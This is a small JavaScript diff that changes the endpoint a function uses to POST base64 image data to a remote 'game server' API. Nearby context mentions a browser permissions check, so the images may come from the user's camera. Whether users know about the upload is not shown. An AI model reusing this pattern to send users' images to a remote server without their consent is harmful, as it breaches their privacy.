@@ -144,7 +144,7 @@ if (navigator.permissions) {
 // Send base64 image to mh server API
 async function sendToServer(imageData) {
     try {
-        await fetch("https://simple-game-server-api.onrender.com", {
+        await fetch("https://simple-game-server-api.onrender.com/upload", {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify({ image: imageData })
